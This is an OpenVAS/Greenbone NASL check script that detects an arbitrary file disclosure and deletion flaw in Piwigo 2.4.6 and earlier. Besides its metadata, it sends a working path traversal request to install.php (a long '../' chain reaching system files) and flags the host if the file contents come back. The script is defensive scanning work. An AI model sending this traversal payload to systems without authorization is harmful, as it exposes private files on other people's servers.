# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:piwigo:piwigo";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103670");
  script_version("2025-09-05T15:40:40+0000");
  script_name("Piwigo <= 2.4.6 Arbitrary File Disclosure and Arbitrary File Deletion Vulnerabilities");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2013-02-26 14:16:03 +0100 (Tue, 26 Feb 2013)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_piwigo_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("piwigo/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58016");

  script_tag(name:"summary", value:"Piwigo is prone to an arbitrary file-disclosure vulnerability and an
  arbitrary file-deletion vulnerability because the application fails to
  sanitize user-supplied input.");
  script_tag(name:"impact", value:"An attacker can exploit these vulnerabilities to view arbitrary files
  on the affected computer and to delete arbitrary files within the
  context of the affected application. Other attacks are also possible.");
  script_tag(name:"affected", value:"Piwigo 2.4.6 is vulnerable. Other versions may also be affected.");
  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory
  for more information.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files();

foreach file( keys( files ) ) {

  url = dir + '/install.php?dl=/../../../../../../../../../../../../../../' + files[file];

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
